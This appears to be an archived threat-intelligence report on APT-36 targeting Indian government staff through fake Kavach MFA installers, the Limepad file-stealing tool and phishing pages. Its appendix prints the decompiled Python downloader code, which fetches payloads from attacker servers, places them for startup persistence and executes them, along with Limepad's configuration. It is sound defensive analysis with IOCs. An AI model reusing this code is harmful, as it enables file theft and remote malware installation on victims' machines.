{
    "id": "3910d733-0b43-4c2f-9b89-8001812c703a",
    "created_at": "2023-01-12T15:07:11.764436Z",
    "updated_at": "2025-03-27T02:17:01.58979Z",
    "deleted_at": null,
    "sha1_hash": "37b3259c46b5c4ad90787f085680f805c08ac202",
    "title": "2022-11-03 - APT-36 Uses New TTPs and New Tools to Target Indian Governmental Organizations",
    "authors": "",
    "file_creation_date": "2022-11-28T19:03:53Z",
    "file_modification_date": "2022-11-28T19:03:53Z",
    "file_size": 3274334,
    "plain_text": "# APT-36 Uses New TTPs and New Tools to Target Indian Governmental Organizations\n\n**[zscaler.com/blogs/security-research/apt-36-uses-new-ttps-and-new-tools-target-indian-governmental-organizations](https://www.zscaler.com/blogs/security-research/apt-36-uses-new-ttps-and-new-tools-target-indian-governmental-organizations)**\n\n## Summary\n\nAPT-36 (also known as Transparent Tribe) is an advanced persistent threat group attributed\nto Pakistan that primarily targets users working at Indian government organizations. Zscaler\nThreatLabz has been closely monitoring the activities of this group throughout 2022. Our\ntracking efforts have yielded new intelligence about this APT group that has not previously\nbeen documented.\n\nIn this blog, we will describe how this group abuses Google advertisements for the purpose of\nmalvertising to distribute backdoored versions of Kavach multi-authentication (MFA)\napplications. We will shed light on the complete details of the attack chain that have not been\npreviously shared in the public domain. This threat group has also conducted very lowvolume credential harvesting attacks masquerading as official Indian government websites,\nand luring unsuspecting users to enter their credentials.\n\nWe will also describe the functionalities of a completely new data exfiltration tool that we have\ndiscovered being used by the APT-36 group. We've dubbed this tool \"Limepad.\"\n\n## Key points\n\nAPT-36 group is a Pakistan-based advanced persistent threat group which has\nspecifically targeted employees of Indian government related organizations.\n\n\n-----\n\nThis group has remained active throughout 2022 using various techniques such as\nmalvertising, and credential phishing attacks.\n\nAPT-36 has evolved their tactics, techniques and procedures (TTPs) incorporating new\ndistribution methods and new tools.\n\nThe threat actor registered multiple new domains hosting web pages masquerading as\nthe official Kavach app download portal.\n\nThey abused the Google Ads paid search feature to push the malicious domains to the\ntop of Google search results for users in India.\n\nBeginning August 2022, the group started using a new data exfiltration tool which we\nhave named Limepad. This tool was previously undocumented.\n\nWhile most binaries used by APT-36 in this campaign will execute only if the user’s\nmachine is configured with India time zone (IST), we also found 2 binaries using the\nsame code base which included a time zone check for both - India and Sri Lanka. Since\nboth India and Sri Lanka have the same time zone, we consider this check redundant.\n\nCredential harvesting attacks were used to spoof the National Informatics Center’s\nKavach login page with the goal of stealing credentials of government employees.\n\nSeveral instances involved malicious binaries compiled using PyInstaller and sent\npackaged inside VHDX archives.\n\n## Attack flow\n\nFigure 1 illustrates the end-to-end attack-chain of the distribution of backdoored Kavach\nmulti-factor authentication (MFA) applications. Each part of this attack-chain is explained in\nmore details in the later sections of the blog.\n\n\n-----\n\n_Figure 1: Malvertising campaign used to distribute backdoored Kavach MFA apps_\n\n## Distribution mechanism\n\n**Malvertising**\n\nThe malvertising aspect of APT-36 group has not been previously documented, so in this blog\nwe will shed some light on how the threat actor lures Indian government users to download\nbackdoored Kavach multi-factor authentication (MFA) applications.\n\n\n-----\n\nThe threat actor routinely registered new domains and hosted web pages impersonating as\nthe official Kavach application download portal. It then abused Google Ads’ paid search\nfeature, to push malicious attacker-registered fake websites to the top of the search results\nreturned by Google for Kavach-related keywords such as “Kavach download” and “Kavach\napp,” when searched from India.\n\nSeveral of these fake Kavach websites were promoted this way throughout 2022. On\naverage, the attacker promoted each website for a period of one month before cycling to the\nnext one.\n\nFigure 2 shows a calendar highlighting different times at which the threat actor was abusing\nGoogle ads to promote corresponding malicious sites\n\n_Figure 2: Calendar showing when the Google ads were run by APT-36_\n\nThe complete list of malicious websites impersonating the Kavach portal are listed in the\nIOCs section.\n\nFigure 3 and 4 show two examples of how the malicious search result ads looked like at the\ntime they were live.\n\n\n-----\n\n_Figure 3: Google advertisement to promote kavach-app[.]com_\n\n_Figure 4: Google advertisement to promote kavach-app[.]in_\n\nFigure 5 shows a web page impersonating the Kavach application download portal. The\nthreat actor leveraged Wordpress to host these webpages and the theme remained\nconsistent across all the malicious pages.\n\n\n-----\n\n_Figure 5: Attacker-registered site masquerading as Kavach app download portal_\n\n**Third party application stores**\n\nIn addition to this, we also discovered that this threat group controls certain third party\napplication stores which offer downloads for various applications. One such example is the\nacmarketsapp[.]com store. While at first this site seems benign and appears to offer\ndownloads for generic applications only, we noticed that the threat actor added a few posts to\ndownload Indian government related applications such as Kavach and Hamraaz.\n\nUpon closer inspection and monitoring this website over a period of time, we uncovered the\nfollowing new TTPs.\n\n**Updating download links**\n\nThis app store is used as a gateway to redirect the users to attacker-registered domains\nhosting the backdoored versions of Kavach application. Each time the threat actor registered\na new malicious website, they would update the download link on the app store to point to the\nlatest attacker-registered site.\n\nTo understand this better, we took snapshot of this website at different points of time in 2022.\nBy leveraging the web archive feature, it can be seen in Figure 6 that in May 2022, the\ndownload link for Kavach on this app store pointed to kavach-app[.]com (which is a confirmed\nattacker-registered domain used in the campaign).\n\n\n-----\n\n_Figure 6: Snapshot of malicious link on acmarketsapp[.]com in May 2022_\n\nA few months later in October 2022, the threat actor updated the link to point to another\nmalicious site (kavachauthentication.blogspot[.]com) as shown in Figure 7.\n\n_Figure 7: Snapshot of malicious link on acmarketsapp[.]com in October 2022_\n\n**Malvertising**\n\n\n-----\n\nThe app store - acmarketsapp[.]com itself is pushed to the top in Google search results for\ncertain search keywords from India by abusing the Google Ads paid search feature as\ndescribed earlier.\n\nBy combining these techniques, it allows APT-36 to operate these third party app stores as a\ngateway to redirect unsuspecting users to their malicious sites hosting the latest backdoored\nvariants of Indian government applications.\n\n## Technical analysis\n\n**A new data exfiltration tool - LimePad**\n\nWe recently identified a new and previously undocumented data exfiltration tool used by this\nAPT group. It is distributed as a Python-based application packaged inside a VHDX file.\nBased on the unique strings present in the first iteration of this stealer, we have named it\nLimePad.\n\nIn this blog, we are sharing some of the key functionalities of this new tool. A more in-depth\ntechnical analysis write up of this tool will be published by us as a follow-up blog since we are\nstill investigating their activities.\n\nSimilar to some of the other malicious binaries used by the SideCopy APT group in the past,\nthis new tool is a PyInstaller-based payload as well. We found 2 unique examples of the new\ntool in-the-wild, both of which were distributed inside very large VHDX files with size greater\nthan 60 MB, each.\n\nThe main purpose of this new tool is to constantly upload any new file of interest from the\nvictim's machine to the attacker's server. It synchronizes this file stealing operation between\nthe victim's machine and the attacker's server by maintaining a local custom SQLite\ndatabase. This database holds the latest records of all the files which are uploaded, in queue\nor newly modified. It is done to ensure that any new files or modifications to existing local files\nare synced up with the remote server.\n\n**Time zone check**\n\nBefore starting any malicious activity, it checks whether the keyword \"india\" is present in the\ntimezone config of the machine. Due to this, the payload will execute only on machines\nconfigured in India time zone.\n\nOnce it confirms that the user is located in India, it will download a decoy PDF from the\nattacker’s server which is displayed to the victim as a social engineering lure.\n\n\n-----\n\nWe analyzed the objects in the decoy PDF file to recover the metadata corresponding to\ngeneration of the PDF and we uncovered a key indicator which further helped us correlate\nthis activity to APT-36 with a high-confidence.\n\nFigure 8 shows the metadata which indicates that this PDF was created with the author\nname: “Apolo Jones” and Microsoft Word 2016 was used to generate the PDF.\n\n_Figure 8: metadata of the decoy PDF file_\n\nThis is the same string present in the PDB path of multiple backdoored variants of Kavach\napplication used by APT-36 in 2022.\n\nOne such example is the backdoored Kavach binary with MD5 hash:\n6b552512c1b6479d8a8ae526663af864\n\nPDB path: C:\\Users\\Apolo Jones\\source\\repos\\Kavach\\obj\\Release\\Kavach.pdb\n\n**Key functionalities and configuration of Limepad**\n\nThis data exfiltration tool is modular and contains many custom Python libraries developed by\nthe attacker to assist the main functionality of LimePad. There is also a config file called\n\"control\" which is used by LimePad for its settings. The complete config file is available in the\nAppendix. Below we give a brief overview of the config fields which can help understand the\nfeatures and functionalities of this stealer at a high-level.\n\nVERSION field is configured as \"0.1-18\". This indicates that the tool is in very early stages of\ndevelopment by the threat actor.\n\nUSERFILE defines the name of the local SQLite database which is used to keep track of the\nfile sync operations. In the first version of this tool, it was configured as \"Limepad.db\" due to\nwhich we have named this tool as \"Limepad\"\n\nThe fields, STARTDATA, LOCKDOORS, and DOORS are used to create a Windows URL\nShortcut file which is used for the purpose of persistence. This URL shortcut file is placed in\nthe Windows Startup directory with the name: \"Limepad.dll\" and it points to the local file path\nof the malicious payload as shown below.\n\n\n-----\n\n**[InternetShortcut]**\n**URL=file:///<path_to_malicious_binary>**\n\nA similar persistence mechanism was used by another tool in SideCopy APT's arsenal in\n2021.\n\nSERVERS field is used to configure an array of attacker-controlled C2 servers. In both the\nidentified samples, only one C2 server was configured each time. However, the code has\nsupport for multiple C2 servers and will cycle through them until it finds a working C2 server.\n\nDUSSEN field contains a hex-encoded version of the string - \"india\". This is what is used for\nthe India time zone check in the main subroutine of Limepad before starting any malicious\nactivity.\n\nThe fields - DBTABLES, DBTABLES_INDEXES and SYNC_RULES_CONFIG all correspond\nto the structure and configuration of the tables in the local SQLite database.\n\nFigure 9 shows the structure of the local SQLite database used for synchronizing files\nbetween infected machine and server.\n\n_Figure 9: Structure of the local SQLite database_\n\nFigure 10 shows an example of contents of the SQLite database on an infected VM.\n\n_Figure 10: Contents of a database from an infected VM_\n\nIt is important to note that \"SYNC_RULES_CONFIG\" contains a set of rules which defines\nwhich files the attacker is interested in stealing.\n\n\n-----\n\nIt has a different set of file extensions configured for HOME, FIXED and REMOVABLE drives.\nBased on the configured file extensions, it is evident that the threat actor is interested in\nstealing documents (PDF, text and MS Office files), email local databases (DBX format) and\nvarious drawing file extensions such as DWG and DXF. These drawing file extensions\ncorrespond to \"AutoCAD\" or computer-aided design vector files.\n\n## Network communication\n\nBelow are the main steps in network communication of LimePad. It is important to note that in\nall cases, the user-agent used in network communication corresponds to the Python\napplication. In this case - \"Python-urllib/2.7\". This might change in future since the attacker\ncan configure a custom user-agent to blend in with legit browser communication.\n\nAlso, in each request to the server, an HTTP request header field called \"Auth_Token\" will be\npresent. This is used to authenticate with the C2 server. This value is the same as the\npassword which is also sent in the HTTP request. This 32 characters password is generated\nby base64-encoding the random value generated by os.random() using the following code.\n\npassword = base64.urlsafe_b64encode(os.urandom(30))[:32]\n\nFigure 11 below shows the sequence of network requests sent by the data exfiltration tool.\n\n_Figure 11: network traffic from the data exfiltration tool_\n\nBelow is a brief description of the different stages of network requests.\n\n**Server check**\n\nSends a GET request to the file bind.php on the server. Once the server responds with\n\"pong!\", it indicates the configured server is working well.\n\n**Registration of infected machine with the server**\n\n\n-----\n\nSends a POST request to the file information.php on the server with the credentials used to\nregister the infected machine. The username and password are sent as both - HTTP POST\nrequest body and HTTP request headers.\n\n\"Username\" and \"Auth_Token\" fields in request headers correspond to the username and\npassword respectively.\n\nPOST body format is: USERNAME=<username>&PASSWORD=<password>\n\nThis is followed by a GET request to \"information.php\" to confirm user registration.\n\n**Uploading files to the server**\n\nEach file upload request is in the form of HTTP POST request to the file \"adjustfile.php\" on\nthe server. The local file path is included in the URL. The contents of the file are uploaded in\nplaintext.\n\n## Miscellaneous threat intel\n\nAs we indicated earlier, we are still investigating this case. We obtained the list of all the\ninfected machines registered with the attacker’s server. Figure 12 below shows a preview of\nthe latest information. By looking at the usernames of the infected machines, it further\nconfirmed to us that only the users in India were infected.\n\n\n-----\n\n_Figure 12: List of infected machines registered with the attacker’s server_\n\n## Kavach payload analysis\n\nAs mentioned above in the distribution mechanism section, this threat actor uses various\nmalvertising methods to lure unsuspecting Indian government employees to download a\nbackdoored version of the Kavach multi-factor authentication (MFA) application.\n\nFor the purpose of technical analysis we will consider the fake installer with the MD5 hash:\nfaeb19cd668de953afd6f2c953251665\n\n**Stage-1: Fake Installer**\n\nThe fake installer is a .NET binary which masquerades as a legit Kavach application installer\nand uses fake metadata information. Moreover, the binary uses an icon related to the\nNational Informatics Center(NIC) which is an Indian government department under the\nMinistry of Electronics and Information Technology.\n\n\n-----\n\nOn execution, the binary performs following operations:\n\n1. Performs the time zone check and executes further only if the time zone matches Indian\nStandard Time (IST).\n\n2. Extracts and drops the legit Kavach installer in the path \"C:\\ProgramData\\Kavach-Auth\\\".\nThe installer is extracted from the resource section of the binary.\n\n3. Downloads and drops the Stage-2 payload from the URL\n\"http://139.59.79[.]86/hardwell.mp3\" in the path \"C:\\ProgramData\\Kavach-Auth\\hardwell.mp3\"\n\n4. Executes the dropped legit Kavach installer\n\n5. Moves the dropped Stage-2 payload to the path \"C:\\ProgramData\\KavachAuth\\archiveviewer.scr\"\n\n6. Executes the dropped Stage-2 payload\n\n**Stage-2: PyInstaller compiled binary**\n\nThe Stage-2 payload is a Python script compiled to an executable using PyInstaller. For\nanalysis we extracted the Python script which we have included in the Appendix section.\n\nThe script on execution does following major operations:\n\n1. Creates the directory \"c:\\programdata\\WUDFHost\"\n\n2. Creates a log file in the path \"c:\\programdata\\WUDFHost\\logs.txt\" which is updated\naccording to the operations performed during further execution.\n\n3. Performs the time zone check.\n\n4. Downloads, drops and executes the next stage payload.\n\nFor the next stage payload, if the path \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\"\nexists, then the payload is downloaded from the URL \"http://139.59.79[.]86/WUDFHost45.zip\"\nin the path \"c:\\programdata\\WUDFHost45.zip\" else it is downloaded from the URL\n\"http://139.59.79[.]86/WUDFHost35.zip\" in the path \"c:\\programdata\\WUDFHost35.zip\"\n\nThe downloaded payload which is a ZIP file is extracted to path “c:\\programdata\\WUDFHost”.\nFor the payload analyzed, the archive contained three components:\n\n1. Executable (WUDFAgent.exe) - The loader binary\n\n2. DLL (oraclenotepad45.dll) - Main backdoor\n\n3. DLL (dotsqueeze.dll) - Helper DLL\n\n**Stage-3: Loader**\n\nThe Stage-2 Python script executes the loader binary. The loader pretends to be a POS\napplication which on execution does following operations:\n\n\n-----\n\n1. Creates a log file in the path c:\\\\programdata\\\\WUDFHost\\\\process.txt\n2. Loads the assembly from the path \"c:\\\\programdata\\\\WUDFHost\\\\oraclenotepad45.dll\"\n\n3. Creates a fake file in the path \"c:\\\\\\\\programdata\\\\\\\\Expense_Account_Hierarchy.csv\" and\nwrites fake information to it. The information written is extracted from the resource section.\n\n4. Pass the execution control to the loaded assembly\n\n**Stage-4: Backdoor**\n\nThe assembly loaded by the loader is the main backdoor of the infection chain. Similar to\nPython script. We will not cover the full technical analysis for the backdoor payload since it's\nalready covered in some public blog posts but in brief, it contains following functionalities:\n\n1. Taking snapshots\n\n2. Downloading new payloads and executing them\n\n3. Creating persistence\n\n4. Exfiltrating user and system information\n\n5. Exfiltrating file and directory information\n\nThe backdoor also uses a helper DLL where the malware author has delegated functionalities\nlike file download from network, writing file to disk, creating new processes.\n\n## Credential harvesting attack\n\nOne of the key targets of APT-36 is the Indian government and it targets the government\nusers with various Kavach related themes including credential harvesting attacks. These\ncredentials can further be re-used by the threat actor to gain access to government related\ninfrastructure.\n\nA domain with the name nic-updates[.]in was registered on 25th August 2022 and it\nimpersonated the official login page of NIC (National Informatics Center).\n\nThis domain redirected to the malicious login page only when accessed from an Indian IP\naddress, else it redirected to the legitimate official domain of NIC - nic.in\n\nFigure 13 shows the credential phishing page.\n\n\n-----\n\n_Figure 13: Credential phishing page impersonating as Kavach NIC_\n\nIt is important to note that the phishing URL was well-crafted as it mimicked the full URL path\nof the legit Kavach NIC login page.\n\nFake login page URL:\n\nhxxps://kavach.mail.nic-updates[.]in/mfid/secureLogin_showSecureLogin.action#!\n\nLegit login page URL:\n\nhxxps://kavach.mail.gov[.]in/mfid/secureLogin_showSecureLogin.action#!\n\nThe phishing page sent the stolen credentials using an HTTP POST request to a file error.php hosted on the attacker’s server.\n\nThe attacker’s server was using Zimbra and it even had an open directory hosted at the URL:\nhxxps://kavach.mail.nic-updates[.]in/mfid/secureLogin_showSecureLogin.action/web/\n\nFigure 14 shows the contents of the open directory.\n\n\n-----\n\n_Figure 14: Open directory on the server hosting the Kavach phishing page_\n\nThe image file - kavach.jpg in the above open directory stood out based on the file creation\ndate. We pivoted on this image file’s hash, and observed that the same image was also\nreferenced from kavach-app[.]com (a domain which we previously attributed to APT-36\ngroup).\n\nWe also identified another phishing site (kavachmail-govin.rf[.]gd) used by this group using\nthe same theme and code base.\n\n## Zscaler detection status\n\nZscaler’s multilayered cloud security platform detects indicators at various levels, as seen\nhere:\n\n[Win32.Payload.Limepad](https://threatlibrary.zscaler.com/?keyword=Win32.Payload.Limepad)\n\n[Win64.Payload.Limepad](https://threatlibrary.zscaler.com/?keyword=Win64.Payload.Limepad)\n\n[Win32.Downloader.CrimsonRat](https://threatlibrary.zscaler.com/?keyword=Win32.Downloader.CrimsonRat)\n[Win32.Backdoor.SideCopy](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.SideCopy)\n\n[HTML.Phish.TransparentTribe](https://threatlibrary.zscaler.com/?keyword=HTML.Phish.TransparentTribe)\n\n## Conclusion\n\nAPT-36 continues to be one of the most prevalent advanced persistent threat groups focused\non targeting users working in Indian governmental organizations. As described in this blog,\nthey leverage various tactics to lure the victims.\n\nThis group has continued evolving its tactics, techniques and procedures (TTPs) while adding\nnew tools to the arsenal. Applications used internally at the Indian government organisations\nare a popular choice of social engineering theme used by APT-36 groups. Users should\nexercise caution while downloading applications and always ensure to download the\napplications only from official sources.\n\n\n-----\n\nSince APT-36 leverages malvertising to hijack the Google search results, we advise the users\nto be extra careful when clicking on links on Google search results and always verify that they\nare indeed visiting the official website.\n\nWe continue to closely monitor the latest developments of this APT group and ensure to\nprotect our customers against these threats.\n\n## Indicators of compromise\n\n**Limepad C2 domains**\n\nncloudup[.]com\n\ngcloudsvc[.]com\n\n**Credential harvesting sites**\n\nnic-updates[.]in\n\nkavachmail-govin[.]rf[.]gd\n\n**Attacker-registered domains spoofing Kavach site**\n\nkavach-app[.]com\n\nkavachguide[.]com\n\nkavach-app[.]in\n\nget-kavach[.]in\n\ngetkavach[.]com\n\nkavachsupport[.]com\n\nkavachdownload[.]in\n\nkavachauthentication.blogspot[.]com\n\n**Post-infection IOCs**\n\n139.59.79[.]86139.59.79[.]86/song.mp3\n\n139.59.79[.]86/OneDriveHandler45_bf.zip\n\n139.59.79[.]86/OneDriveHandler45.zip\n\n[139.59.79[.]86/C2L!Dem0&PeN/[email protected]/Cert.php](https://www.zscaler.com/cdn-cgi/l/email-protection)\n\nwzxdao[.]com\n\nwzxdao[.]com/onedrivehandlerx86.zip\n\nwzxdao[.]com/OnrDriveHandlerx86.zip\n\n**Decoy file URLs**\n\n\n-----\n\nhxxp://139.59.23[.]88/confirmation_id.pdf\nhxxps://ncloudup[.]com/trendmic/details.pdf\n\nhxxp://wzxdao[.]com/resultupdate.jpg\n\nhttp://139.59.79[.]86/Pictures.jpg\n\n**File hashes**\n\n**File MD5 hash** **Filename**\n\n123b180ed44531bfbac27c6eb0bbe01d Update Portal.vhdx\n\n3817590cf8bec4a768bb84405590272f Student online update.exe\n\n0ed6451ffe34217e44355706f4900ecc NvidiaUpdate (2).scr\n\n94daa776792429d1cb65edc1d525e2fc Student detail.vhdx\n\nc195d6bb06c93b94d39e5c1a2dfc6792 Confirmation_ID.vhdx\n\n889c5c98e88c4889220617f57f5480f7 details.exe\n\nac3f2c8563846134bb42cb050813eac8 Confirmation_ID.exe\n\n## Appendix\n\n**Limepad config file**\n\nimport os, logging\n\nfrom regulator import FileMatcher as r\n\nimport sys\n\nQUERY = []\n\nUSERHOME = os.path.join(os.environ['HOMEDRIVE'], os.environ['HOMEPATH'])\n\nclass FILEFLAG:\n\nQUEUED, SYNCING, SYNCED, IGNORED = range(4)\n\nVERSION = '0.1-$Revision: 18 $'\n\nVERSION = VERSION.replace('$', '').replace('Revision: ', '').strip()\n\nSTARTDATA = os.path.join(os.environ['APPDATA'], 'Microsoft\\\\Windows\\\\Start\n\n\n-----\n\nMenu\\\\Programs\\\\Startup\\\\Limepad )\nROOTDATA = os.path.join(os.environ['APPDATA'], 'Limepad')\n\nUSERFILE = 'Limepad.db'\n\nUSERFILE = os.path.join(ROOTDATA, USERFILE)\n\nLOGFILE = 'Limepad.log'\n\nLOGFILE = os.path.join(os.environ['APPDATA'], LOGFILE)\n\nTEMP_UPLOAD_FOLDER = os.path.join(ROOTDATA, 'tup')\n\nLOCKDOORS = 'URL=file:///' + sys.executable\n\nDOORS = ['.dll', '.url']\n\nSERVERS = [<server_address>]\n\nDUSSEN = '696E646961'\n\nSERVER_PUBKEY = ''\n\nDBTABLES = {'file': [('path', 'VARCHAR'), ('filename', 'VARCHAR'), ('size', 'INT'), ('state',\n'INT'), ('modified', 'REAL'), ('created', 'REAL'), ('queuepriority', 'INT'), ('defertill', 'INT DEFAULT\n0'), ('rpath', 'VARCHAR DEFAULT NULL')], 'syncdirs': [\n\n('path', 'VARCHAR'), ('rule', 'VARCHAR')],\n\n'config': [\n\n('key', 'VARCHAR'), ('value', 'VARCHAR')]}\n\nDBTABLES_INDEXES = {'file': ('queuepriority', 'unique: path, filename'), 'config': ('unique:\nkey', )}\n\nSYNC_RULES_CONFIG = {'HOME': r(\" '*.pdf' or '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or\n'*.mdb*' or '*.dwg' or '*.dxf' or '*.dbx' \"),\n\n'FIXED': r(\" '*.pdf' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dbx' \"),\n\n'REMOVABLE': r(\" size < 5 mb if ('*.jpg' or '*.jpeg' or '*.avi') else (size < 100 mb and ('*.pdf'\nor '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dxf'))\")}\n\nOPTIMIZED_SEND_BLOCKSIZE = 256000\n\nLOG_LEVEL = logging.WARN\n\nlogging.basicConfig(filename=LOGFILE, level=LOG_LEVEL)\nif __name__ == '__main__':\n\nprint globals()\n\n**Kavach fake installer - Python decompiled code**\n\nimport os\n\nfrom win32com.client import Dispatch\n\nimport platform\n\nimport time\n\n#from tzlocal import get_localzone\n\nimport sys\n\nfrom os.path import exists as file_exists\n\nimport urllib\n\nimport time\n\n\n-----\n\nfrom time import sleep\nimport zipfile\n\n#import win32com.client as win32\n\nimport win32com as win32\n\nimport subprocess\n\ndef is_os_64bit():\n\nreturn platform.machine().endswith('64')\n\ndef append_me(text):\n\nwith open(\"c:\\programdata\\WUDFHost\\logs.txt\", \"a\") as myfile:\n\nmyfile.write(text)\n\ndef write_me(text):\n\nif file_exists(\"c:\\programdata\\WUDFHost\\logs.txt\") is True:\n\nprint('bab')\n\npass\n\nelse:\n\nprint('damn')\n\nwith open(\"c:\\programdata\\WUDFHost\\logs.txt\", \"w\") as myfile:\n\nmyfile.write(text)\n\ndef create_dir(text):\n\nif os.path.exists(text) is False:\n\nos.mkdir(text)\n\ndef download_us(url,path):\n\nif os.path.exists(path) is False:\n\nurllib.urlretrieve(url,path)\n\nelse:\n\nprint(\"skipping\")\n\nappend_me(\"skipping\")\n\ndef define_me(text):\n\ntry:\n\nif os.path.exists(text) is True:\n\n\n-----\n\nprint( zip file exists )\nappend_me(\"zip file exists\")\n\nwith zipfile.ZipFile(text, 'r') as zip_ref:\n\nzip_ref.extractall(\"c:\\\\programdata\\\\WUDFHost\")\n\nelse:\n\nprint(\"not find extracted file\")\n\nappend_me(\"not find extracted file\")\n\nexcept Exception as e:\n\nprint(\"already running file\")\n\ndef deaf():\n\ntry:\n\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\n\ndownload_us(\"http://<REDACTED>/WUDFHost45.zip\",\"c:\\\\programdata\\WUDFHost45.zip\")\n\ndefine_me(\"c:\\\\programdata\\\\WUDFHost45.zip\")\n\npass\n\nelse:\n\ndownload_us(\"http://<REDACTED>/WUDFHost35.zip\",\"c:\\\\programdata\\WUDFHost35.zip\")\n\ndefine_me(\"c:\\\\programdata\\\\WUDFHost35.zip\")\n\npass\n\nexcept Exception as e:\n\nprint(\"excption in deaf\")\n\ndef openWorkbook(xlapp, xlfile):\n\ntry:\n\nxlwb = xlapp.Workbooks(xlfile)\n\n#xlwb.Close(True)\n\nexcept Exception as e:\n\ntry:\n\nxlwb = xlapp.Workbooks.Open(xlfile)\n\n#xlwb.Close(True)\n\nexcept Exception as e:\n\nprint(e)\n\nxlwb = None\n\nreturn(xlwb)\n\n\n-----\n\ndef define_me_replica(text):\ntry:\n\nif os.path.exists(text) is True:\n\nprint(\"zip file exists\")\n\nappend_me(\"zip file exists\")\n\nusername = os.environ['USERNAME']\n\nprint(username)\n\nwith zipfile.ZipFile(text, 'r') as zip_ref:\n\nzip_ref.extractall(\"c:\\\\users\\\\\"+username+\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start\nMenu\\\\Programs\\\\Startup\")\n\nelse:\n\nprint(\"not find extracted file\")\n\nappend_me(\"not find extracted file\")\n\nexcept Exception as e:\n\nprint(\"already running file\")\n\ndef def_frames():\n\ntry:\n\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\n\ndownload_us(\"http://<REDACTED>/WUDFAgent_45.zip\",\"c:\\\\programdata\\\\WUDFAgent_45.zip\")\ndefine_me_replica(\"c:\\\\programdata\\\\WUDFAgent_45.zip\")\n\npass\n\nelse:\n\ndownload_us(\"http://<REDACTED>/WUDFAgent_35.zip\",\"c:\\\\programdata\\\\WUDFAgent_35.zip\")\ndefine_me_replica(\"c:\\\\programdata\\\\WUDFAgent_35.zip\")\n\npass\n\nexcept Exception as e:\n\npass\ndef patience_limit():\n\ntry:\n\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\n\nsubprocess.Popen([\"c:\\\\programdata\\\\WUDFHost\\\\WUDFAgent.exe\"])\n\npass\n\nelse:\n\nsubprocess.Popen([\"c:\\\\programdata\\\\WUDFHost\\\\WUDFAgent.exe\"])\n\npass\n\nexcept Exception as e:\n\npass\n\n\n-----\n\nif __name__ == __main__ :\ntry:\n\ncreate_dir(\"c:\\programdata\\WUDFHost\")\n\nwrite_me(\"Starter\\n\")\n\n#list_folders = []\n\n#list_files = []\n\n#lines = ''\n\nusername = os.environ['USERNAME']\n\n#for root, dirs,files in os.walk('c:\\\\users\\\\'+username+'\\\\appdata',topdown=False):\n\n#  for name in files:\n\n#    print(os.path.join(root,name))\n\n#    list_folders.append(os.path.join(root,name))\n\n#  for name in dirs:\n\n#    print(os.path.join(root,name))\n\n#    list_files.append(os.path.join(root,name))\n\nprint(\"Directory Created\")\n\nif '.py' not in sys.argv[0]:\n\n#create_dir(\"c:\\programdata\\WUDFHost\")\nprint(\"Directory Created\")\n\n#write_me(\"Starter\")\n\nprint(\"Log File Created\")\n\ntzname = time.tzname\n\n#local_tz = get_localzone()\n\nprint(\"Got the TimeZone\")\n\nappend_me(\"Got the TimeZone : \"+str(tzname) + \"\\n\")\n\nif \"sri lanka\" in str(tzname).lower() or \"india\" in str(tzname).lower():\n\nprint(\"Correctly Identified TimeZone\")\n\nif os.path.exists(\"c:\\\\Program Files\\\\Microsoft Office\\\\Office15\") is True or\nos.path.exists(\"c:\\\\Program Files\\\\Microsoft Office\\\\Office16\") is True:\n\nprint(\"Office is 2010 or 2016\")\n\nappend_me(\"Office is 2010 or 2016\\n\")\n\nif is_os_64bit():\n\nprint(\"Machine is x64\")\n\nappend_me(\"Machine is x64\\n\")\n\nappend_me(\"File Downloading Started\\n\")\n\nprint(\"File Downloading Started\")\n\n\n-----\n\n##def_frames()\n\nappend_me(\"All Files Downloaded\\n\")\n\nprint(\"All Files Downloaded\")\n\ndeaf()\n\nprint(\"Files Extracted\")\n\nappend_me(\"Files Extracted\\n\")\n\nprint(\"Going for always\")\n\nappend_me(\"going for always\")\n\nelse:\n\nprint(\"Machine is x86\")\n\nappend_me(\"Machine is x86\\n\")\n\n##def_frames()\n\nappend_me(\"All Files Downloaded\\n\")\n\nprint(\"All Files Downloaded\")\n\nprint(\"Going for always\")\n\nappend_me(\"going for always\")\n\ndeaf()\n\nprint(\"Files Extracted\")\n\nappend_me(\"Files Extracted\\n\")\n\nelse:\n\nprint(\"Other than Office 16 or Office 13\")\n\nappend_me(\"Other than Office 16 or Office 13\\n\")\n\n\n-----\n\n##def_frames()\n\nappend_me(\"All Files Downloaded\\n\")\n\nprint(\"All Files Downloaded\")\n\ndeaf()\n\nprint(\"Going for always\")\n\nappend_me(\"going for always\")\n\nprint(\"Files Extracted\")\n\nappend_me(\"Files Extracted\\n\")\n\nlist_folders = []\n\nlist_files = []\n\nfor root, dirs,files in os.walk('c:\\\\users\\\\'+username+'\\\\appdata',topdown=False):\n\nfor name in files:\n\nprint(os.path.join(root,name))\n\nlist_folders.append(os.path.join(root,name))\n\nfor name in dirs:\n\nprint(os.path.join(root,name))\n\nlist_files.append(os.path.join(root,name))\n\npatience_limit()\n\nelse:\n\nprint(\"Not the time Zone You want to run\")\n\nappend_me(\"Not the time Zone You want to run\\n\")\n\nelse:\n\nprint(\"Find my self in .py directory\")\n\nappend_me(\"Find my self in .py directory\\n\")\n\nexcept Exception as e:\n\n#append_me(str(e))\n\nprint(str(e))\n\nappend_me(str(e)+\"\\n\")\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-03 - APT-36 Uses New TTPs and New Tools to Target Indian Governmental Organizations.pdf"
    ],
    "report_names": [
